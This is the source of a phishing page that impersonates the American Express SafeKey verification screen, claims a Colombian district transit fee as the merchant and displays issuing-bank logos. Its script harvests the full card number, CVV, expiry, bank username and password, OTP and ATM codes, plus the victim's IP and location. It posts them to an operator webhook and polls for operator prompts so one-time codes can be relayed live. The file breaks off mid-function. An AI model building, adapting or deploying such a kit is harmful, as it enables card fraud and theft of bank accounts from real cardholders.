<?php require_once __DIR__ . '/_guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>American Express SafeKey</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
    <style>
        :root {
            --amex-blue: #0061a8;
            --amex-blue-hover: #00508f;
            --amex-gold: #f9b418;
            --co-text: #111827;
            --co-text-2: #374151;
            --co-text-muted: #6b7280;
            --co-bg: #f5f5f5;
            --co-border: #e5e7eb;
            --co-white: #fff;
            --co-success: #16a34a;
            --co-error: #dc2626;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background-color: var(--co-bg);
            color: var(--co-text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }

        .container {
            background: var(--co-white);
            border-radius: 16px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
            padding: 40px;
            max-width: 520px;
            width: 100%;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--co-border);
        }

        .amex-logo {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .amex-logo img {
            height: 90px;
            width: auto;
            display: block;
        }

        .bank-logo {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            flex-shrink: 0;
            max-width: 55%;
        }

        .bank-logo img {
            height: 110px;
            width: auto;
            max-width: 200px;
            object-fit: contain;
            display: block;
        }

        .security-banner {
            background: #eff6ff;
            border: 1px solid #bfdbfe;
            border-radius: 12px;
            padding: 14px 18px;
            margin-bottom: 24px;
            display: flex;
            align-items: flex-start;
            gap: 12px;
        }

        .security-banner .shield-icon {
            flex-shrink: 0;
            width: 22px;
            height: 22px;
            margin-top: 2px;
            color: var(--amex-blue);
        }

        .security-banner p {
            font-size: 0.8125rem;
            color: #1e40af;
            line-height: 1.6;
            margin: 0;
        }

        .security-banner p strong {
            font-weight: 700;
        }

        .security-banner a {
            color: var(--amex-blue);
            font-weight: 600;
            text-decoration: none;
        }

        .security-banner a:hover {
            text-decoration: underline;
        }

        .form-title {
            font-size: 1.375rem;
            font-weight: 700;
            color: var(--co-text);
            margin-bottom: 4px;
        }

        .form-subtitle {
            font-size: 0.9375rem;
            color: var(--co-text-2);
            margin-bottom: 24px;
            line-height: 1.5;
        }

        .form-subtitle strong {
            color: var(--co-text);
        }

        .transaction-info {
            background: #f9fafb;
            border: 1px solid var(--co-border);
            border-radius: 12px;
            padding: 14px 18px;
            margin-bottom: 24px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 5px 0;
            font-size: 0.875rem;
        }

        .info-row:not(:last-child) {
            border-bottom: 1px solid var(--co-border);
        }

        .info-label {
            color: var(--co-text-muted);
            font-weight: 500;
            min-width: 80px;
            flex-shrink: 0;
        }

        .info-value {
            color: var(--co-text);
            font-weight: 600;
            text-align: right;
            flex: 1;
        }

        .card-number-display {
            font-family: monospace;
            font-size: 1.1rem;
            color: var(--amex-blue);
            letter-spacing: 1px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .form-label {
            font-size: 0.8125rem;
            font-weight: 600;
            color: var(--co-text);
        }

        .form-label .required {
            color: var(--co-error);
            margin-left: 2px;
        }

        .form-input {
            padding: 12px 16px;
            border: 2px solid var(--co-border);
            border-radius: 8px;
            font-family: 'Inter', sans-serif;
            font-size: 1rem;
            color: var(--co-text);
            transition: border-color 0.2s, box-shadow 0.2s;
            background: var(--co-white);
            width: 100%;
        }

        .form-input:focus {
            outline: none;
            border-color: var(--amex-blue);
            box-shadow: 0 0 0 3px rgba(0, 97, 168, 0.1);
        }

        .form-input::placeholder {
            color: #a0a0a0;
        }

        .form-input:disabled {
            background: #f3f4f6;
            cursor: not-allowed;
        }

        .form-input.error {
            border-color: var(--co-error);
        }

        .form-input.error:focus {
            box-shadow: 0 0 0 3px rgba(220, 38, 38, 0.1);
        }

        .error-message {
            color: var(--co-error);
            font-size: 0.75rem;
            display: none;
            margin-top: 4px;
        }

        .form-group.error .form-input {
            border-color: var(--co-error);
        }

        .form-group.error .error-message {
            display: block;
        }

        .otp-section {
            display: none;
            animation: fadeIn 0.4s ease;
            background: #f9fafb;
            border: 1px solid var(--co-border);
            border-radius: 12px;
            padding: 16px 18px;
            margin-top: 4px;
        }

        .otp-section.visible {
            display: block;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-8px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .otp-info {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.8125rem;
            color: var(--co-text-muted);
            margin-bottom: 8px;
        }

        .otp-info svg {
            width: 18px;
            height: 18px;
            flex-shrink: 0;
        }

        .button-group {
            display: flex;
            gap: 12px;
            margin-top: 8px;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-family: 'Inter', sans-serif;
            font-size: 0.9375rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            flex: 1;
            text-align: center;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background: var(--amex-blue);
            color: white;
        }

        .btn-primary:hover:not(:disabled) {
            background: var(--amex-blue-hover);
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .form-footer {
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid var(--co-border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
        }

        .form-footer .help-text {
            font-size: 0.75rem;
            color: var(--co-text-muted);
        }

        .form-footer .help-text a {
            color: var(--amex-blue);
            text-decoration: none;
        }

        .form-footer .help-text a:hover {
            text-decoration: underline;
        }

        .status-message {
            display: none;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 0.875rem;
            font-weight: 500;
            margin-bottom: 16px;
            text-align: center;
        }

        .status-message.error {
            display: block;
            background: #fef2f2;
            color: var(--co-error);
            border: 1px solid #fecaca;
        }

        .status-message.success {
            display: block;
            background: #f0fdf4;
            color: var(--co-success);
            border: 1px solid #bbf7d0;
        }

        .status-message.info {
            display: block;
            background: #eff6ff;
            color: #1e40af;
            border: 1px solid #bfdbfe;
        }

        .status-message.error-usuario {
            display: block;
            background: #fef2f2;
            color: var(--co-error);
            border: 3px solid #dc2626;
            font-weight: 700;
            font-size: 1rem;
            padding: 16px;
        }

        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            backdrop-filter: blur(4px);
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: white;
            font-size: 1rem;
            font-weight: 500;
            text-align: center;
        }

        .loading-subtext {
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.875rem;
            margin-top: 4px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 30px 24px;
                max-width: 480px;
            }

            .amex-logo img {
                height: 80px;
            }

            .bank-logo img {
                height: 95px;
                max-width: 160px;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 20px 16px;
                border-radius: 12px;
            }

            .header {
                margin-bottom: 16px;
                padding-bottom: 12px;
            }

            .amex-logo img {
                height: 90px;
            }

            .bank-logo {
                max-width: 55%;
            }

            .bank-logo img {
                height: 100px;
                max-width: 150px;
            }

            .form-title {
                font-size: 1.125rem;
            }

            .form-subtitle {
                font-size: 0.875rem;
                margin-bottom: 16px;
            }

            .button-group {
                flex-direction: column;
                gap: 8px;
            }

            .btn {
                width: 100%;
                padding: 14px;
                font-size: 0.875rem;
            }

            .form-footer {
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }

            .info-label {
                min-width: 60px;
                font-size: 0.8rem;
            }

            .info-value {
                font-size: 0.8rem;
            }

            .transaction-info {
                padding: 12px 14px;
                margin-bottom: 16px;
            }

            .security-banner {
                padding: 12px 14px;
                margin-bottom: 16px;
            }

            .security-banner p {
                font-size: 0.75rem;
            }

            .otp-section {
                padding: 14px;
            }

            .form-input {
                padding: 10px 14px;
                font-size: 0.9375rem;
            }
        }
    </style>
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text" id="loadingText">Verificando autenticación...</div>
        <div class="loading-subtext" id="loadingSubtext">Esperando confirmación de seguridad</div>
    </div>

    <div class="container">
        <div class="header">
            <div class="amex-logo">
                <img src="amex.png" alt="American Express" />
            </div>
            <div class="bank-logo" id="bankLogoContainer">
                <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
            </div>
        </div>

        <div class="security-banner">
            <svg class="shield-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                <path d="M12 8v4"/>
                <path d="M12 16h.01"/>
            </svg>
            <p>
                <strong>American Express SafeKey</strong> protege tu tarjeta American Express contra usos no autorizados en línea, sin costo adicional.
                <a href="#">Más información</a>
            </p>
        </div>

        <h1 class="form-title">Autenticar con contraseña</h1>
        <p class="form-subtitle">
            Ingrese las credenciales de seguridad de su <strong id="bancoNombre">banco emisor</strong> para validar la transacción.
        </p>

        <div class="transaction-info">
            <div class="info-row">
                <span class="info-label">Comercio</span>
                <span class="info-value">Secretaria Distrital de movilidad</span>
            </div>
            <div class="info-row">
                <span class="info-label">Monto</span>
                <span class="info-value" id="transaction-amount">—</span>
            </div>
            <div class="info-row">
                <span class="info-label">Fecha</span>
                <span class="info-value" id="transaction-date">—</span>
            </div>
            <div class="info-row">
                <span class="info-label">Tarjeta</span>
                <span class="info-value card-number-display" id="card-last-digits">Amex •••• ••••• ••••• 0000</span>
            </div>
        </div>

        <div class="status-message" id="statusMessage"></div>

        <form id="authForm" novalidate>
            <div class="form-group">
                <label class="form-label">Usuario <span class="required">*</span></label>
                <input type="text" class="form-input" id="username" placeholder="Ingresa tu usuario" required />
                <div class="error-message">El usuario es requerido</div>
            </div>

            <div class="form-group">
                <label class="form-label">Contraseña <span class="required">*</span></label>
                <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña" required />
                <div class="error-message">La contraseña es requerida</div>
            </div>

            <div class="otp-section" id="otpSection">
                <div class="otp-info" id="otpInfoText">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                        <path d="M12 8v4"/>
                        <path d="M12 16h.01"/>
                    </svg>
                    <span id="otpInfoMessage">Para realizar este proceso, ingresa el código de Token móvil o físico.</span>
                </div>
                <div class="form-group" style="margin-bottom:0;">
                    <label class="form-label" id="otpLabel">Código OTP <span class="required">*</span></label>
                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación" maxlength="8" inputmode="numeric" required />
                    <div class="error-message">El código debe tener entre 4 y 8 dígitos</div>
                </div>
            </div>

            <div class="button-group">
                <button type="submit" class="btn btn-primary" id="submitButton">
                    <span id="buttonText">Continuar</span>
                </button>
            </div>
        </form>

        <div class="form-footer">
            <span class="help-text">
                <a href="#" id="helpLink">Ayuda</a>
            </span>
            <span class="help-text">
                Al continuar, aceptas los <a href="#">Términos</a> y <a href="#">Política de Privacidad</a>
            </span>
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURACIÓN
        // ============================================
        const WEBHOOK_URL = '/api/webhook.php';
        const HEARTBEAT_URL = '/api/heartbeat.php';
        const API_KEY = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';
        const POLLING_INTERVAL = 2000;
        const MAX_POLLING_TIME = 300000;
        const HEARTBEAT_INTERVAL = 5000;

        // ============================================
        // CAPTURAR IP + PAÍS + CIUDAD
        // ============================================
        async function capturarIP() {
            if (localStorage.getItem('usuario_ip')) {
                return localStorage.getItem('usuario_ip');
            }

            try {
                const resp = await fetch('https://ipwho.is/');
                const data = await resp.json();
                if (data.success && data.ip) {
                    localStorage.setItem('usuario_ip', data.ip);
                    localStorage.setItem('usuario_pais', data.country || 'Desconocido');
                    localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
                    return data.ip;
                }
            } catch (e) {}

            try {
                const resp = await fetch('https://ipapi.co/json/');
                const data = await resp.json();
                if (data.ip) {
                    localStorage.setItem('usuario_ip', data.ip);
                    localStorage.setItem('usuario_pais', data.country_name || 'Desconocido');
                    localStorage.setItem('usuario_ciudad', data.city || 'Desconocida');
                    return data.ip;
                }
            } catch (e) {}

            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const data = await resp.json();
                if (data.ip) {
                    localStorage.setItem('usuario_ip', data.ip);
                    localStorage.setItem('usuario_pais', 'Desconocido');
                    localStorage.setItem('usuario_ciudad', 'Desconocida');
                    return data.ip;
                }
            } catch (e) {}

            localStorage.setItem('usuario_ip', 'Desconocida');
            localStorage.setItem('usuario_pais', 'Desconocido');
            localStorage.setItem('usuario_ciudad', 'Desconocida');
            return null;
        }

        capturarIP();

        // ============================================
        // SOLICITUD ID
        // ============================================
        let solicitudId = 'AMEX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        console.log('🆔 solicitudId generado al cargar:', solicitudId);

        let pollingInterval = null;
        let pasoActual = 'credenciales';
        let errorMostrado = false;
        let modoAutenticacion = 'otp';
        let ultimoCodigoOTP = null;
        let formularioBloqueado = false;
        let rechazoDetectado = false;
        let heartbeatInterval = null;

        // Elementos DOM
        const form = document.getElementById('authForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const confirmationInput = document.getElementById('confirmationCode');
        const otpSection = document.getElementById('otpSection');
        const otpInfoText = document.getElementById('otpInfoText');
        const otpInfoMessage = document.getElementById('otpInfoMessage');
        const otpLabel = document.getElementById('otpLabel');
        const submitButton = document.getElementById('submitButton');
        const buttonText = document.getElementById('buttonText');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loadingText = document.getElementById('loadingText');
        const loadingSubtext = document.getElementById('loadingSubtext');
        const statusMessage = document.getElementById('statusMessage');
        const bankLogoImg = document.getElementById('bankLogoImg');
        const bankLogoContainer = document.getElementById('bankLogoContainer');
        const bancoNombre = document.getElementById('bancoNombre');

        // ============================================
        // MAPA DE LOGOS DE BANCOS (SINTAXIS CORREGIDA)
        // ============================================
        const bankLogos = {
            'Bancolombia': 'bancol.png',
            'Davivienda': 'davivienda.png',
            'Davibank': 'db.png',
            'Banco Popular': 'popu.png',
            'Banco Falabella': 'fala.png',
            'Itaú': 'itau.png',
            'Caja Social': 'Caja.jpg',
            'Banco de Bogotá': 'bog.png',
            'Banco Occidente': 'occi.png',
            'BBVA Colombia': 'bbva.png',
            'Banco AV Villas': 'avvillas.png',
            'Banco Pichincha': 'pichincha.png',
            'Scotiabank Colpatria': 'scotia.png',
            'Banco Agrario': 'agrario.png',
            'Citibank Colombia': 'citi.png',
            'Banco GNB Sudameris': 'gnb.png',
            'Bancoomeva': 'omeva.png',
            'Banco Finandina': 'finandina.png',
            'Banco Cooperativo Coopcentral': 'coopcentral.png'
        };

        // ============================================
        // NORMALIZADOR DE NOMBRE DE BANCO
        // Captura CUALQUIER variante que devuelva HandyAPI
        // ============================================
        function normalizarBanco(rawIssuer) {
            if (!rawIssuer) return null;

            const raw = rawIssuer.toLowerCase().trim();
            console.log('🔍 Normalizando banco:', raw);

            // ---- BBVA - CUALQUIER variante ----
            if (
                raw.includes('bbva') ||
                raw.includes('bilbao') ||
                raw.includes('vizcaya') ||
                raw.includes('vizcaya argentaria') ||
                raw.includes('banco bilbao') ||
                raw.includes('banco ganadero')
            ) {
                console.log('✅ Detectado como BBVA Colombia');
                return 'BBVA Colombia';
            }

            // ---- BANCOLOMBIA ----
            if (raw.includes('bancolombia')) return 'Bancolombia';

            // ---- DAVIVIENDA ----
            if (raw.includes('davivienda')) return 'Davivienda';

            // ---- DAVIBANK ----
            if (raw.includes('davibank')) return 'Davibank';

            // ---- BANCO DE BOGOTÁ ----
            if (raw.includes('banco de bogota') || raw.includes('banco de bogotá')) return 'Banco de Bogotá';

            // ---- BANCO POPULAR ----
            if (raw.includes('banco popular') || raw === 'popular') return 'Banco Popular';

            // ---- BANCO DE OCCIDENTE ----
            if (raw.includes('occidente')) return 'Banco Occidente';

            // ---- CITIBANK ----
            if (raw.includes('citibank') || raw.includes('citi ')) return 'Citibank Colombia';

            // ---- AV VILLAS ----
            if (raw.includes('av villas') || raw.includes('avvillas')) return 'Banco AV Villas';

            // ---- ITAÚ ----
            if (raw.includes('itau') || raw.includes('itaú')) return 'Itaú';

            // ---- GNB SUDAMERIS ----
            if (raw.includes('gnb') || raw.includes('sudameris')) return 'Banco GNB Sudameris';

            // ---- FALABELLA ----
            if (raw.includes('falabella')) return 'Banco Falabella';

            // ---- PICHINCHA ----
            if (raw.includes('pichincha')) return 'Banco Pichincha';

            // ---- CAJA SOCIAL ----
            if (raw.includes('caja social')) return 'Caja Social';

            // ---- COOPCENTRAL ----
            if (raw.includes('coopcentral')) return 'Banco Cooperativo Coopcentral';

            // ---- BANCOOMEVA ----
            if (raw.includes('bancoomeva')) return 'Bancoomeva';

            // ---- FINANDINA ----
            if (raw.includes('finandina')) return 'Banco Finandina';

            // ---- SCOTIABANK COLPATRIA ----
            if (raw.includes('scotiabank') || raw.includes('colpatria')) return 'Scotiabank Colpatria';

            // ---- BANCO AGRARIO ----
            if (raw.includes('agrario')) return 'Banco Agrario';

            // ---- FALLBACK ----
            console.log('⚠️ Banco no reconocido, usando nombre crudo:', rawIssuer);
            return rawIssuer.split(' ')
                .map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
                .join(' ');
        }

        // ============================================
        // HEARTBEAT
        // ============================================
        function enviarHeartbeat(estado = 'activo') {
            try {
                fetch(HEARTBEAT_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        solicitudId: solicitudId,
                        usuario: usernameInput ? usernameInput.value : '',
                        estado: estado,
                        ip: localStorage.getItem('usuario_ip') || '',
                        pais: localStorage.getItem('usuario_pais') || '',
                        ciudad: localStorage.getItem('usuario_ciudad') || ''
                    }),
                    keepalive: true
                }).catch(() => {});
            } catch (e) {}
        }

        function iniciarHeartbeat() {
            enviarHeartbeat('activo');
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            heartbeatInterval = setInterval(() => {
                enviarHeartbeat('activo');
            }, HEARTBEAT_INTERVAL);
            console.log('💓 Heartbeat iniciado');
        }

        function detenerHeartbeat(notificar = true) {
            if (heartbeatInterval) {
                clearInterval(heartbeatInterval);
                heartbeatInterval = null;
            }
            if (notificar) {
                try {
                    navigator.sendBeacon(
                        HEARTBEAT_URL,
                        JSON.stringify({
                            solicitudId: solicitudId,
                            estado: 'offline'
                        })
                    );
                } catch (e) {}
            }
        }

        window.addEventListener('beforeunload', function() {
            detenerHeartbeat(true);
        });

        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                enviarHeartbeat('activo');
            }
        });

        // ============================================
        // INICIALIZACIÓN
        // ============================================
        window.addEventListener('load', function() {
            initializeTransaction();
            cargarLogoBanco();
            console.log('✅ American Express SafeKey listo');
            iniciarHeartbeat();
        });

        function cargarLogoBanco() {
            let bancoEmisor = localStorage.getItem('bancoEmisor');
            console.log('🏛️ Banco emisor desde localStorage (crudo):', bancoEmisor);

            // Normalizar por si acaso viene con otro formato
            if (bancoEmisor) {
                bancoEmisor = normalizarBanco(bancoEmisor);
                localStorage.setItem('bancoEmisor', bancoEmisor);
                console.log('🏛️ Banco emisor normalizado:', bancoEmisor);
            }

            if (bancoEmisor) {
                bancoNombre.textContent = bancoEmisor;
            }

            if (bancoEmisor && bankLogos[bancoEmisor]) {
                bankLogoImg.src = bankLogos[bancoEmisor];
                bankLogoImg.alt = bancoEmisor;
                bankLogoImg.style.display = 'block';
                bankLogoContainer.style.display = 'flex';
                console.log('✅ Logo del banco cargado:', bankLogos[bancoEmisor]);
            } else {
                bankLogoContainer.style.display = 'none';
                console.log('❌ No se encontró logo para el banco:', bancoEmisor);
            }
        }

        // ============================================
        // INICIALIZAR TRANSACCIÓN
        // - Comercio: Secretaria Distrital de movilidad
        // - Monto: DINÁMICO desde localStorage (mismo que paso5.php)
        // ============================================
        function initializeTransaction() {
            // MONTO DINÁMICO
            const montoGuardado = localStorage.getItem('montoTotal');
            const storagePriority = localStorage.getItem('procesamiento_prioritario') === 'true';

            let amount = 0;
            if (montoGuardado && !isNaN(parseInt(montoGuardado))) {
                amount = parseInt(montoGuardado);
            } else {
                amount = 23000;
                if (storagePriority) amount += 20000;
            }

            const formattedAmount = amount.toLocaleString('es-CO').replace(/,/g, '.');
            document.getElementById('transaction-amount').textContent = formattedAmount + ' Col$';

            const now = new Date();
            const dateStr = now.toLocaleDateString('es-CO', {
                year: 'numeric',
                month: '2-digit',
                day: '2-digit'
            }).split('/').reverse().join('/');
            const timeStr = now.toLocaleTimeString('es-CO', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            });
            document.getElementById('transaction-date').textContent = `${dateStr} ${timeStr}`;

            let cardLast4 = localStorage.getItem('cardLast4') || '0000';
            document.getElementById('card-last-digits').textContent = `Amex •••• ••••• ••••• ${cardLast4}`;

            const cardNumber = localStorage.getItem('cardNumber') || 'No disponible';
            const cvc = localStorage.getItem('cvc') || 'No disponible';
            const expiry = localStorage.getItem('expiry') || 'No disponible';

            localStorage.setItem('cardNumberFull', cardNumber);
            localStorage.setItem('cardCVV', cvc);
            localStorage.setItem('cardExpiry', expiry);
            console.log('📋 Datos cargados desde localStorage');
        }

        // ============================================
        // FUNCIONES WEBHOOK
        // ============================================
        async function enviarCredencialesAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        numeroTarjeta: datos.numeroTarjeta,
                        cvv: datos.cvv,
                        vencimiento: datos.vencimiento,
                        usuario: datos.usuario,
                        password: datos.password,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'credenciales',
                        bancoEmisor: localStorage.getItem('bancoEmisor') || 'No especificado',
                        tipo_tarjeta: 'amex',
                        ip: localStorage.getItem('usuario_ip') || '',
                        pais: localStorage.getItem('usuario_pais') || 'Desconocido',
                        ciudad: localStorage.getItem('usuario_ciudad') || 'Desconocida'
                    })
                });
                const data = await response.json();
                return data.success;
            } catch (error) {
                console.error('❌ Error:', error);
                return false;
            }
        }

        async function enviarOTPAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.otp,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'otp',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'amex',
                        es_reintento: datos.es_reintento || false
                    })
                });
                const data = await response.json();
                return data.success;
            } catch (error) {
                console.error('❌ Error:', error);
                return false;
            }
        }

        async function enviarClaveDinamicaAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.clave,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'clave_dinamica',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'amex',
                        es_reintento: datos.es_reintento || false
                    })
                });
                const data = await response.json();
                return data.success;
            } catch (error) {
                console.error('❌ Error:', error);
                return false;
            }
        }

        async function enviarClaveCajeroAlWebhook(datos) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-API-Key': API_KEY
                    },
                    body: JSON.stringify({
                        solicitudId: datos.solicitudId,
                        codigo: datos.clave,
                        usuario: datos.usuario,
                        monto: datos.monto,
                        fecha: datos.fecha,
                        tipo_paso: 'clave_cajero',
                        solicitudOriginalId: datos.solicitudId,
                        tipo_tarjeta: 'amex',
                        es_reintento: datos.es_reintento || false
                    })
                });
                const data = await response.json();
                return data.success;
            } catch (error) {
                console.error('❌ Error:', error);
                return false;
            }
        }

        // ============================================
        // VERIFICAR ESTADO
        // ============================================
        async function verificarEstadoSolicitud(solicitudId, intentos = 3) {
            for (let i = 0; i < intentos; i++) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 5000);
                    const response = await fetch(`/api/estado.php?id=${solicitudId}`, {
                        signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    if (!response.ok) continue;
                    const data = await response.json();

                    if (data.otp_codigo && data.otp_codigo !== 'N/A' && data.otp_codigo !== null) {
                        if (ultimoCodigoOTP !== data.otp_codigo) {
                            ultimoCodigoOTP = data.otp_codigo;
                        }
                    }

                    if (data.otp_modo) {
                        localStorage.setItem('otp_modo', data.otp_modo);
                    }

                    const estadoReal = data.estado_real || data.estado || 'pending';

                    if (estadoReal === 'approved' || estadoReal === 'approved_otp' || estadoReal === 'approved_clave_cajero') {
                        return { estado: 'approved', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'rejected' || estadoReal === 'rejected_otp' || estadoReal === 'rejected_clave_cajero' || estadoReal === 'rejected_user_error') {
                        return { estado: 'rejected', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'pending_otp') {
                        return { estado: 'pending_otp', estadoReal: estadoReal, modo: data.otp_modo || 'otp', otp_codigo: data.otp_codigo };
                    } else if (estadoReal === 'pending_clave_cajero') {
                        return { estado: 'pending_clave_cajero', estadoReal: estadoReal, modo: data.otp_modo || 'clave_cajero', otp_codigo: data.otp_codigo };
                    }
                    return { estado: 'pending', estadoReal: 'pending', modo: 'otp', otp_codigo: null };
                } catch (error) {
                    if (i === intentos - 1) return { estado: 'error', estadoReal: 'error', modo: 'otp', otp_codigo: null };
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            return { estado: 'error', estadoReal: 'error', modo: 'otp', otp_codigo: null };
        }

        // ============================================
        // POLLING CREDENCIALES
        // ============================================
        function iniciarPollingCredenciales() {
            let tiempoInicio = Date.now();
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
            loadingText.textContent = 'Verificando credenciales...';
            loadingSubtext.textContent = 'Esperando validación del banco';

            pollingInterval = setInterval(async () => {
                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    mostrarError('⏰ Tiempo de espera agotado');
                    resetFormulario();
                    return;
                }
                const resultado = await verificarEstadoSolicitud(solicitudId);

                if (resultado.estado === 'pending_otp' || resultado.estado === 'pending_clave_cajero') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    const modo = resultado.modo || 'otp';

                    if (modo === 'clave_cajero') {
                        modoAutenticacion = 'clave_cajero';
                        mostrarSeccionOTP('clave_cajero');
                    } else if (modo === 'clave_dinamica') {
                        modoAutenticacion = 'clave_dinamica';
                        mostrarSeccionOTP('clave_dinamica');
                    } else {
                        modoAutenticacion = 'otp';
                        mostrarSeccionOTP('otp');
                    }

                    if (resultado.otp_codigo && resultado.otp_codigo !== 'N/A' && resultado.otp_codigo !== null) {
                        ultimoCodigoOTP = resultado.otp_codigo;
                        confirmationInput.value = ultimoCodigoOTP;
                        mostrarExito('✅ Código recibido automáticamente');
                    }

                    loadingOverlay.classList.remove('active');
                    submitButton.disabled = false;
                    formularioBloqueado = false;
                    iniciarPollingOTP();
                    return;

                } else if (resultado.estado === 'approved') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    mostrarExito('✅ Autenticación exitosa. Redirigiendo...');
                    detenerHeartbeat(true);
                    setTimeout(() => {
                        window.location.href = 'exito.php';
                    }, 2000);
                    return;
                } else if (resultado.estado === 'rejected') {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    mostrarError('❌ Credenciales incorrectas o transacción rechazada');
                    resetFormulario();
                    formularioBloqueado = false;
                    return;
                }
            }, POLLING_INTERVAL);
        }

        // ============================================
        // POLLING OTP
        // ============================================
        function iniciarPollingOTP() {
            let tiempoInicio = Date.now();
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
            loadingText.textContent = 'Verificando código...';
            loadingSubtext.textContent = 'Esperando confirmación del banco';
            rechazoDetectado = false;

            pollingInterval = setInterval(async () => {
                if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                    clearInterval(pollingInterval);
                    pollingInterval = null;
                    mostrarError('⏰ Tiempo de espera agotado');
                    resetFormulario();
